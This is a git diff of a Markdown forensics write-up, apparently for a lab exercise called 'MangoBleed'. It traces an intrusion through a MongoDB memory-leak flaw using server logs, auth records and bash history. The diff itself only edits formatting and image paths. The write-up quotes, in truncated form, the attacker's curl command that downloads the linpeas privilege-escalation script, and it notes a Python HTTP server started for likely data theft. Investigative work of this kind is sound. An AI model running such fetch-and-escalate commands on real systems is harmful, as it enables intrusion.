@@ -1,12 +1,12 @@
 # MangoBleed Writeup
 
-01 <sup>st </sup> January 2026
+01 `<sup>`st `</sup>` January 2026
 
 Prepared by: CyberJunkie
 
 Solved By: Leviii
 
-Difficulty: <font color="Green">Very Easy </font>
+Difficulty: `<font color="Green">`Very Easy `</font>`
 
 ## Scenario
 
@@ -26,7 +26,7 @@ The MongoDB vulnerability discussed in the scenario is known as **MongoBleed**, 
 
 The designated CVE ID for this vulnerability is **CVE-2025-14847**.
 
-![MangoBleed Task 1](../assets/images/mangobleed/mangobleed_task_1.png)
+![MangoBleed Task 1](/assets/images/mangobleed/mangobleed_task_1.png)
 
 ---
 
@@ -36,7 +36,7 @@ The version of MongoDB installed on the server was **v8.0.16**.
 
 This information was obtained from the `/var/lib/dpkg/status` file.
 
-![MangoBleed Task 2](../assets/images/mangobleed/mangobleed_task_2.png)
+![MangoBleed Task 2](/assets/images/mangobleed/mangobleed_task_2.png)
 
 ---
 
@@ -46,7 +46,7 @@ The attacker exploited the vulnerability from the remote IP address **65.0.76.43
 
 This was identified by reviewing `NETWORK` log entries in `/var/log/mongodb/mongod.log`, which showed accepted incoming connections from this IP.
 
-![MangoBleed Task 3](../assets/images/mangobleed/mangobleed_task_3.png)
+![MangoBleed Task 3](/assets/images/mangobleed/mangobleed_task_3.png)
 
 ---
 
@@ -56,7 +56,7 @@ The earliest confirmed malicious activity occurred on **2025-12-29 at 05:25:52**
 
 This timestamp corresponds to the first accepted connection entry associated with the attacker's IP in the MongoDB logs.
 
-![MangoBleed Task 4](../assets/images/mangobleed/mangobleed_task_4.png)
+![MangoBleed Task 4](/assets/images/mangobleed/mangobleed_task_4.png)
 
 ---
 
@@ -70,7 +70,7 @@ The following PowerShell command was used to count the matching log entries:
 (Select-String -Path "mongod.log" -Pattern "65.0.76.43").Count
 ```
 
-![MangoBleed Task 5](../assets/images/mangobleed/mangobleed_task_5.png)
+![MangoBleed Task 5](/assets/images/mangobleed/mangobleed_task_5.png)
 
 ---
 
@@ -80,7 +80,7 @@ The attacker successfully gained interactive remote access on **2025-12-29 at 05
 
 This was confirmed from `/var/log/auth.log`, which recorded a successful login using keyboard-interactive authentication for the `mongoadmin` user.
 
-![ManogBleed Task 6](../assets/images/mangobleed/mangobleed_task_6.png)
+![ManogBleed Task 6](/assets/images/mangobleed/mangobleed_task_6.png)
 
 ---
 
@@ -94,7 +94,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 
 This was found in `/home/mongoadmin/.bash_history`.
 
-![MongoBleed Task 7](../assets/images/mangobleed/mangobleed_task_7.png)
+![MongoBleed Task 7](/assets/images/mangobleed/mangobleed_task_7.png)
 
 ---
 
@@ -104,7 +104,7 @@ The attacker focused on the **/var/lib/mongodb** directory.
 
 Bash history shows the attacker navigating to this directory and starting a Python HTTP server, indicating potential data exfiltration activity.
 
-![MangoBleed Task 8](../assets/images/mangobleed/mangobleed_task_8.png)
+![MangoBleed Task 8](/assets/images/mangobleed/mangobleed_task_8.png)
 
 ---
 
